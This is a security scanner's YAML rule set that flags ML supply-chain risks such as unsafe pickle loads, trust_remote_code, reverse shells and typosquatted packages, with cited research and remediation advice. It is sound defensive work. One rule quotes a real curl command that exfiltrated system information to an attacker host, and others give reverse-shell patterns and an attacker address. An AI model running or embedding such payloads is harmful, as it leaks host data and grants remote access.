rules:
- id: MEDUSA-MLSC-SCAN-001
  name: pickle-unsafe-load-in-ml-context
  severity: CRITICAL
  category: ml_supply_chain
  patterns:
  - (?i)pickle\.load\s*\(
  - (?i)pickle\.loads\s*\(
  - (?i)torch\.load\s*\([^)]*(?!weights_only\s*=\s*True)
  file_types:
  - '*.py'
  - '*.ipynb'
  message: Unsafe pickle deserialization detected in ML context
  description: 'Unsafe pickle.load() or torch.load() without weights_only=True detected.
    Pickle deserialization allows arbitrary code execution via __reduce__ magic method.
    Zhao et al. (ASE ''24) found 91 malicious models on Hugging Face exploiting this
    vector; Liu et al. (2025) identified 22 loading paths and 133 exploitable gadgets
    bypassing existing scanners. Kellas et al. (2025) confirmed 44.9% of popular Hugging
    Face models still use insecure pickle format. NIST AI 100-2e2023 (Vassilev 2024)
    classifies this as AI supply chain critical vulnerability; CVE-2019-6446 assigned
    for pickle in neural network tools.

    '
  remediation: 'Use torch.load(path, weights_only=True) for PyTorch models. Prefer
    safetensors format (huggingface_hub safetensors library). For scikit-learn models
    consider PyMilo (Rostami 2024) for transparent JSON serialization. If pickle is
    unavoidable, validate SHA-256 hash of model file before loading and scan with
    ModelScan/Fickling.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-502
- id: MEDUSA-MLSC-SCAN-002
  name: pickle-reduce-exploit-pattern
  severity: CRITICAL
  category: ml_supply_chain
  patterns:
  - (?i)def\s+__reduce__\s*\(
  - (?i)__reduce_ex__\s*\(
  - (?i)pickle\.dumps\s*\(.*__reduce__
  file_types:
  - '*.py'
  - '*.ipynb'
  message: Pickle __reduce__ exploit pattern detected — potential malicious model
    payload
  description: 'The __reduce__ magic method is the primary mechanism for pickle-based
    arbitrary code execution (ACE). Attackers implement __reduce__ to return (os.system,
    (''cmd'',)) or equivalent, executing arbitrary shell commands when the model is
    deserialized. Liu et al. (2025) documented this as the canonical pickle exploit
    pattern with opcodes STACK_GLOBAL and REDUCE. Zhao et al. (ASE ''24) found real-world
    deployments including reverse shells connecting to 192.248.1.167:4242 in Hugging
    Face models.

    '
  remediation: 'Any model file containing __reduce__ definitions should be treated
    as potentially malicious. Use PickleBall (Kellas 2025) for policy-enforced safe
    deserialization. Scan model with Fickling (Trail of Bits) and ModelScan (ProtectAI).
    Never load models from untrusted sources without signature verification.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-502
- id: MEDUSA-MLSC-SCAN-003
  name: trust-remote-code-enabled
  severity: CRITICAL
  category: ml_supply_chain
  patterns:
  - (?i)trust_remote_code\s*=\s*True
  - (?i)trust_repo\s*=\s*True
  - (?i)from_pretrained\s*\([^)]*trust_remote_code
  file_types:
  - '*.py'
  - '*.ipynb'
  - '*.yaml'
  - '*.yml'
  message: trust_remote_code=True detected — arbitrary code execution from remote
    repository
  description: 'Setting trust_remote_code=True instructs the transformers library
    to download and execute arbitrary Python code from the remote model repository
    during model loading. Siddiq et al. (2026) documented three attack scenarios:
    (S1) malicious fork where attacker uploads reverse shell in tokenizer.py/__init__.py/modeling_*.py,
    (S2) compromised trusted maintainer account, (S3) attacker-in-the-middle cache
    poisoning of ~/.cache/huggingface/. Study found 36,697 Hugging Face repos with
    custom code (1.74%), peak 4,898 new repos/month. CWE-502 was dominant weakness
    (65.45% of Semgrep findings). Hugging Face hosts 2.1M+ models making manual review
    impractical.

    '
  remediation: 'Never set trust_remote_code=True unless you have verified the model
    repository source code manually. Pin to specific commit hash. Use models from
    verified publishers with cryptographic signing. Consider sandboxed execution environment
    for any model requiring trust_remote_code. Prefer models using SafeTensors format
    that do not require custom loading code.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-94
- id: MEDUSA-MLSC-SCAN-004
  name: reverse-shell-in-ml-code
  severity: CRITICAL
  category: ml_supply_chain
  patterns:
  - (?i)pty\.spawn\s*\(.*[/\\]bin[/\\]sh
  - (?i)os\.dup2\s*\(s\.fileno
  - (?i)socket\.socket.*socket\.connect.*RHOST
  file_types:
  - '*.py'
  - '*.ipynb'
  message: Reverse shell payload detected in ML model code
  description: 'Reverse shell pattern detected — direct indicator of malicious model
    payload. Zhao et al. (ASE ''24) documented real-world reverse shell found in Hugging
    Face model ''star23/baller10'': cross-platform shell using pty.spawn(''/bin/sh'')
    on Linux and powershell.exe on Windows, connecting to RHOST:RPORT (observed: 192.248.1.167:4242).
    This is the most dangerous class of ML supply chain payload, granting full remote
    system access when model is loaded. Siddiq et al. (2026) confirmed YARA rules
    can detect such reverse shell signatures across model repositories.

    '
  remediation: 'Model file must be quarantined immediately and not loaded. Report
    to model hub security team (Hugging Face: security@huggingface.co). Perform full
    system audit if model was previously loaded. Block repository from future access.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-78
- id: MEDUSA-MLSC-SCAN-005
  name: dataset-loading-script-dangerous-apis
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)subprocess\.check_output\s*\(
  - (?i)datasets\.load_dataset\s*\([^)]*trust_remote_code
  - (?i)subprocess\.run\s*\([^)]*shell\s*=\s*True
  file_types:
  - '*.py'
  - '*.ipynb'
  message: Dangerous API usage in dataset loading context — potential data loading
    script injection
  description: 'Dangerous subprocess usage in dataset loading context. Zhao et al.
    (ASE ''24) documented real malicious dataset loading script in ''Yash2998db/stan_small'':
    subprocess.check_output(''(uname -a; ps auxww) | curl -s https://eoxvp5idbpacu69.m.pipedream.net/$(whoami)
    --data-binary @-'', shell=True) This exfiltrated system info to attacker''s server
    on dataset load. Siddiq et al. (2026) found B602 (shell=True subprocess) as top
    high-severity finding on OpenCSG. Zhao et al. identified 13 subprocess.* calls
    and 12 os.system calls in Hugging Face dataset loading scripts.

    '
  remediation: 'Never use datasets.load_dataset() with trust_remote_code=True on untrusted
    datasets. Audit all subprocess calls in dataset loading code. Hugging Face plans
    to disable automatic execution of dataset loading scripts by default (require
    explicit opt-in). Use datasets from verified, signed sources only.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-78
- id: MEDUSA-MLSC-SCAN-006
  name: model-hub-unsafe-download
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)hf_hub_download\s*\(
  - (?i)snapshot_download\s*\(
  - (?i)from_pretrained\s*\([^)]*revision\s*=\s*['"](?!sha256:)
  file_types:
  - '*.py'
  - '*.ipynb'
  - '*.yaml'
  - '*.yml'
  message: Unsafe Hugging Face Hub download without integrity verification (CWE-494)
  description: 'Model download from Hugging Face Hub without cryptographic integrity
    verification. Siddiq et al. (2026) identified B615 (Unsafe Hugging Face Hub download)
    as the most common medium-severity finding: 3,803 instances on Hugging Face (4.00%
    of custom-code repos). NIST AI 100-2e2023 (Vassilev 2024) recommends verifying
    cryptographic hashes of model artifacts as basic supply chain integrity check.
    Meiklejohn et al. (2025) documented namesquatting attacks where adversaries mimic
    reputable model names to distribute malware. Without pinning to a specific commit
    hash or verified revision, any model update could introduce malicious code.

    '
  remediation: 'Always pin model downloads to a specific commit hash (revision=''abc123...'').
    Verify SHA-256 hash of downloaded model files before loading. Consider using model
    signing via Sigstore (Meiklejohn et al. 2025). Use only models from verified publishers
    with cryptographic attestations.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-494
- id: MEDUSA-MLSC-SCAN-007
  name: joblib-dill-cloudpickle-unsafe-load
  severity: CRITICAL
  category: ml_supply_chain
  patterns:
  - (?i)joblib\.load\s*\(
  - (?i)dill\.load\s*\(
  - (?i)cloudpickle\.load\s*\(
  file_types:
  - '*.py'
  - '*.ipynb'
  message: Unsafe pickle-variant deserialization (joblib/dill/cloudpickle) detected
  description: 'Pickle-variant serialization formats (joblib, dill, cloudpickle) are
    equally vulnerable to arbitrary code execution as pickle itself. Zhao et al. (ASE
    ''24) classified these as ''Insecure'' in their 15-format taxonomy. Liu et al.
    (2025) specifically documents joblib supporting multiple compression algorithms
    (gzip, zlib, bz2, lzma) that create additional evasion opportunities for malicious
    payloads. Siddiq et al. (2026) identified joblib as a vulnerable format in all
    five platforms studied. Parida et al. (2025) found Pickle and Joblib to be ''most
    challenging to integrate'' AND most insecure.

    '
  remediation: 'Migrate from joblib/dill/cloudpickle to safetensors (deep learning)
    or PyMilo (traditional ML). If joblib is required, validate SHA-256 hash before
    loading and ensure model originates from a trusted, signed source. Scan with ModelScan
    prior to loading. Restrict joblib loading to models from internal, controlled
    sources.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-502
- id: MEDUSA-MLSC-SCAN-008
  name: keras-lambda-layer-exploit
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)Lambda\s*\(\s*lambda
  - (?i)tf\.keras\.layers\.Lambda
  - (?i)keras\.layers\.Lambda
  file_types:
  - '*.py'
  - '*.ipynb'
  - '*.h5'
  message: Keras Lambda layer usage detected — potential code execution via HDF5 deserialization
  description: 'Keras Lambda layers serialize Python bytecode in marshal format within
    HDF5 model files. Zhao et al. (ASE ''24) found 72 instances of Keras Lambda layers
    in suspicious models and documented that arbitrary code can be embedded in these
    layers executing on model load. NIST AI 100-2e2023 classifies HDF5 Keras models
    as ''Potential'' security risk. Keras addressed Lambda layer vulnerabilities in
    version 2.13 but older H5 models remain vulnerable. Liu et al. (2025) identified
    Keras as one of five AI/ML frameworks with exploitable model loading paths.

    '
  remediation: 'Avoid Lambda layers in production models; replace with custom Layer
    subclasses. Upgrade to Keras 2.13+ which addresses Lambda layer vulnerabilities.
    Scan HDF5 model files with ModelScan (ProtectAI). Prefer TensorFlow SavedModel
    or safetensors format over HDF5 for production deployments.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-502
- id: MEDUSA-MLSC-SCAN-009
  name: huggingface-config-name-or-path-suspicious
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)"_name_or_path"\s*:\s*"(?!.*(?:bert|gpt|llama|mistral|gemma|qwen|phi|falcon|bloom|opt|roberta|distilbert|t5|bart|xlm|electra|deberta|albert|camembert|mbart|pegasus|led|bigbird|longformer|whisper|wav2vec|vit|clip|deit|swin|beit|resnet|efficientnet|yolo|detr|sam|stable|sdxl))[^"]{3,}"(?=[,}])
  - (?i)"url"\s*:\s*"https?://(?!(?:huggingface\.co|cdn-lfs|s3\.amazonaws))[^"]{5,}"
  - (?i)"file"\s*:\s*"(?:/|\.\.)[^"]{3,}"
  file_types:
  - '*.json'
  - config.json
  message: Suspicious configuration file values detected — potential AI supply chain
    config poisoning
  description: 'Suspicious values in Hugging Face configuration files detected. Ding
    et al. (2025) documented three attack scenarios using config files: (1) file operations
    — loading unauthorized files via file path keys, (2) website operations — connections
    to unknown URLs enabling IP exposure and RCE, (3) repository operations — _name_or_path
    redirect to malicious repositories. Rule-based analysis of 150,000 repos found
    35,761 suspicious repos with repository operation risk. CONFIGSCAN confirmed hauson-fan/RagRetriever
    and HuggingWorm/RagRetriever as confirmed malicious via _name_or_path manipulation.

    '
  remediation: 'Validate all config.json values before loading models. Verify _name_or_path
    matches the expected repository name. Inspect URL values in config files before
    executing code that resolves them. Use CONFIGSCAN (Ding et al. 2025) for automated
    config file security analysis.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-610
- id: MEDUSA-MLSC-SCAN-010
  name: eval-exec-in-ml-model-code
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)\beval\s*\(
  - (?i)\bexec\s*\(
  - (?i)__builtins__\[.eval.
  file_types:
  - '*.py'
  - '*.ipynb'
  message: eval()/exec() usage detected in ML model code — potential code injection
    via deserialization
  description: 'eval() and exec() in ML model loading code create code injection vulnerabilities.
    Siddiq et al. (2026) found CWE-95 (Eval Injection) as second most common weakness:
    19.48% of Semgrep findings on Hugging Face (517 instances). Zhao et al. (ASE ''24)
    lists eval and exec as top-tier ''Unsafe Builtin Functions'' in Table 3 for ML
    model security analysis, identifying 23 eval and 27 exec instances in malicious
    models. YARA rules used by Siddiq et al. specifically target ''eval detected''
    pattern across model repositories. Liu et al. (2025) found eval as a primary risky
    function gadget in their 133-gadget taxonomy for scanner bypass.

    '
  remediation: 'Remove eval()/exec() from model loading code. Use AST-based safe evaluation
    alternatives for configuration parsing. Implement code review gating for any PR
    introducing eval/exec in model-related code paths.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-95
- id: MEDUSA-MLSC-SCAN-011
  name: hardcoded-credentials-in-model-code
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)(?:api_key|apikey|secret_key|access_token|hf_token)\s*=\s*['"][A-Za-z0-9_\-]{16,}['"]
  - (?i)(?:password|passwd|pwd)\s*=\s*['"][^'"]{8,}['"]
  - (?i)HUGGINGFACE_TOKEN\s*=\s*['"][A-Za-z0-9_]{16,}['"]
  file_types:
  - '*.py'
  - '*.ipynb'
  - '*.yaml'
  - '*.yml'
  message: Hard-coded credentials detected in ML model code (CWE-259)
  description: 'Hard-coded API keys, tokens, or passwords in ML model loading code.
    Siddiq et al. (2026) found CWE-259 (Hard-coded Password) as the second most common
    weakness across all platforms: 10,097 instances on Hugging Face (10.62%), 2,278
    on ModelScope (10.99%). Embedded Hugging Face tokens grant access to private repositories
    and can be extracted by anyone who downloads the model code. This creates both
    a credential theft risk and a supply chain amplification risk where a single compromised
    token can access multiple private model repositories.

    '
  remediation: 'Remove all hard-coded credentials from model code. Use environment
    variables (os.environ.get(''HF_TOKEN'')) or secure secret management (HashiCorp
    Vault, AWS Secrets Manager). Rotate any tokens that have appeared in committed
    code. Use git-secrets or similar pre-commit hooks to prevent future credential
    commits.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-259
- id: MEDUSA-MLSC-SCAN-012
  name: model-hub-namesquatting-pattern
  severity: MEDIUM
  category: ml_supply_chain
  patterns:
  - (?i)(?:huggingface|hf)\.co/(?:meta-llama|openai|anthropic|google|microsoft|mistralai|deepseek-ai)(?![-/][A-Za-z])
  - (?i)from_pretrained\s*\(['"](?:meta_llama|0penai|anthr0pic|g00gle|micros0ft)['"]
  - (?i)from_pretrained\s*\(['"][a-zA-Z0-9_-]{1,8}/(?:llama|gpt|claude|gemini)['"]
  file_types:
  - '*.py'
  - '*.ipynb'
  - '*.yaml'
  - '*.yml'
  - '*.txt'
  message: Potential model namesquatting pattern detected — verify publisher identity
  description: 'Potential namesquatting of popular ML model names detected. Meiklejohn
    et al. (2025) documented namesquatting attacks on Hugging Face where attackers
    create accounts mimicking reputable organizations (meta-llama, openai, google,
    etc.) to distribute malicious models. Fewer than 2% of Hugging Face models use
    GPG signing, making identity verification difficult. Traditional anti-virus cannot
    detect malicious ML models. ProtectAI maintains a database of dozens of unsafe/suspicious
    models discovered through such attacks.

    '
  remediation: 'Verify publisher identity using official organization accounts (meta-llama,
    google, mistralai, deepseek-ai). Check model card for official links and verify
    commit signing. Cross-reference with official organization websites. Consider
    using model signing verification (Sigstore integration proposed by Meiklejohn
    et al. 2025).

    '
  owasp_llm: LLM03:2025
  cwe: CWE-345
- id: MEDUSA-MLSC-SCAN-013
  name: mcp-server-unverified-install
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)npx\s+['"]?-y['"]?\s+[^\s]
  - (?i)uvx\s+[^\s]+\s+--from\s+
  - (?i)mcp.*server.*(?:npm|npx|pip|uvx).*install
  file_types:
  - '*.py'
  - '*.json'
  - '*.yaml'
  - '*.yml'
  - '*.sh'
  message: Unverified MCP server installation detected — potential agent supply chain
    rug pull
  description: 'Unverified MCP (Model Context Protocol) server being installed without
    integrity verification. Pautsch et al. (2025) identified agent/MCP rug pull as
    a key supply chain risk in agent sharing infrastructure: an agent or MCP server
    published to a registry can later be modified or replaced by the original publisher
    or a compromised account, and autonomous agents inheriting the dependency inherit
    the attack. The leftpad npm incident pattern applies — removing or replacing a
    popular MCP server package can cascade across thousands of dependent pipelines.
    npx -y installs run without user confirmation from npm registry without integrity
    verification.

    '
  remediation: 'Pin MCP server packages to specific versions with SHA hash verification.
    Audit MCP server source code before deployment. Use lock files (package-lock.json,
    uv.lock) to prevent unexpected updates. Prefer MCP servers from verified publishers
    with signed packages. Monitor for unexpected updates to pinned MCP server versions.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-494
- id: MEDUSA-MLSC-SCAN-014
  name: tensorflow-unsafe-api-usage
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)tf\.io\.read_file\s*\(
  - (?i)tf\.saved_model\.load\s*\([^)]*['"][^'"]*(?:http|ftp|s3://)[^'"]*['"]
  - (?i)tf\.keras\.models\.load_model\s*\([^)]*compile\s*=\s*True
  file_types:
  - '*.py'
  - '*.ipynb'
  message: Potentially unsafe TensorFlow model loading or I/O operation
  description: 'Unsafe TensorFlow API usage in model loading context. NIST AI 100-2e2023
    (Vassilev 2024) identifies CVE-2022-29216 for TensorFlow deserialization vulnerabilities.
    Zhao et al. (ASE ''24) found 35 cases of unsafe TensorFlow ReadFile/WriteFile
    operators and classifies TensorFlow SavedModel/Checkpoint/TFLite as ''Potential''
    security risk due to support for custom operators that can execute arbitrary code.
    Loading TensorFlow SavedModels with custom operators from untrusted sources can
    enable supply chain attacks. Siddiq et al. (2026) confirmed TensorFlow/Keras models
    on OpenMMLab showed B301 (pickle deserialization) as most common high-severity
    issue.

    '
  remediation: 'Load TensorFlow models only from trusted, verified sources. Disable
    custom operators when loading from untrusted sources (options=tf.saved_model.LoadOptions(
    experimental_io_device=''/job:localhost'')). Scan SavedModel directories with
    ModelScan. Use safetensors when available instead of SavedModel format.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-502
- id: MEDUSA-MLSC-SCAN-015
  name: git-lfs-missing-hash-verification
  severity: MEDIUM
  category: ml_supply_chain
  patterns:
  - (?i)git\s+lfs\s+pull
  - (?i)git\s+lfs\s+fetch
  - (?i)\.gitattributes.*filter=lfs
  file_types:
  - '*.sh'
  - '*.bash'
  - '*.yaml'
  - '*.yml'
  - .gitattributes
  message: Git LFS usage without hash verification — potential ML model cache poisoning
  description: 'Git LFS usage without explicit SHA-256 hash verification of downloaded
    content. Havryliak (2025) documented that absence of hash verification on cloud
    storage side allows injecting malicious code into ML models bypassing standard
    security tools. The LFS Batch API uses HTTPS separately from Git''s SSH transport,
    creating a ''security context gap''. Cloud storage providers do not verify hash
    checksums on write, enabling cache poisoning: attacker substitutes malicious model
    content while Git pointer still shows expected SHA-256 hash. Critical for ML pipelines
    where model weights stored in LFS are downloaded in CI/CD for training or inference.

    '
  remediation: 'Implement SHA-256 hash verification of LFS-downloaded files before
    use in ML pipelines. Enforce ''Verify-before-Write'' on LFS server configuration.
    Use read-only deploy keys for LFS access; prohibit write access via deploy keys.
    Implement strict quota attribution per repository. Consider migrating ML model
    storage to Hugging Face Hub or S3 with artifact signing for stronger integrity
    guarantees.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-345
- id: MEDUSA-MLSC-SCAN-016
  name: ml-package-typosquatting-risk
  severity: MEDIUM
  category: ml_supply_chain
  patterns:
  - (?i)pip\s+install\s+(?:torchvison|nump[^y]|transformen|scklearn|hugginfac|pytoch|skleran)
  - (?i)import\s+(?:torchvison|nump[^y]|transformen|scklearn|hugginfac|pytoch|skleran)
  - (?i)requirements.*(?:torchvison|nump[^y]|transformen|scklearn|hugginfac|pytoch|skleran)
  file_types:
  - '*.py'
  - '*.txt'
  - '*.cfg'
  - '*.toml'
  message: Potential ML package typosquat detected — verify package name
  description: 'Potential typosquatting of core ML packages detected. ML supply chain
    attacks targeting package managers (PyPI) use near-identical package names to
    compromise ML pipelines. Kalu & Davis (2025) document how artifacts traversing
    trust boundaries (mirrors, corporate proxies) lose registry security guarantees,
    enabling package substitution. Common ML package typosquats target: numpy (torchvison,
    nump*), torch (pytoch), transformers (transformen), scikit-learn (scklearn), huggingface
    (hugginfac). These packages are direct dependencies in virtually every ML training
    and inference pipeline.

    '
  remediation: 'Verify exact package names before installation. Use hash-pinned requirements
    files (pip install --require-hashes -r requirements.txt). Enable PyPI package
    signing verification. Use internal package mirrors with strict allowlists. Consider
    SBOM (Software Bill of Materials) for all ML dependencies.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-1357
- id: MEDUSA-MLSC-SCAN-017
  name: yaml-unsafe-load-in-ml-context
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)yaml\.load\s*\([^)]*(?!Loader\s*=\s*yaml\.SafeLoader)
  - (?i)yaml\.load\s*\([^,)]+\)
  - (?i)yaml\.full_load\s*\(
  file_types:
  - '*.py'
  - '*.ipynb'
  message: Unsafe YAML load in ML context — potential code execution via YAML deserialization
  description: 'yaml.load() without SafeLoader or yaml.full_load() can execute arbitrary
    Python code via YAML deserialization. Zhao et al. (ASE ''24) specifically identified
    yaml.load as an unsafe API (Table 5) found in Hugging Face dataset loading scripts,
    flagging 1 instance in their scan. Siddiq et al. (2026) found YAML-based configuration
    parsing in model loading code creating injection risks. YAML deserialization attacks
    allow object construction and arbitrary code execution when loading attacker-controlled
    configuration files for ML models.

    '
